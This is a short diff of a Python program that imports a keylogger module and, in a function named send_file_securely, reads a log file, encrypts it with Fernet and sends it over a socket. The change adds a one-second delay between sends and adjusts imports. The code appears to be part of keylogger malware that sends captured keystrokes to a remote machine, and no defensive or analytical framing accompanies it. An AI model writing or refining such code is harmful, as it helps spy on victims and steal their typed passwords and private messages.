@@ -1,10 +1,9 @@
 import keylogger
 import socket
-import requests
 import os  
+import time
 from datetime import datetime
 from cryptography.fernet import Fernet
-import signal
 import psutil
 
 def get_filename():
@@ -51,6 +50,7 @@ def send_file_securely(client_socket):
             lines = file.read()
             encrypted_lines = Fernet(key).encrypt(lines.encode('utf-8'))
             client_socket.send(encrypted_lines)
+            time.sleep(1)
             file.close()
             del file
     except Exception:
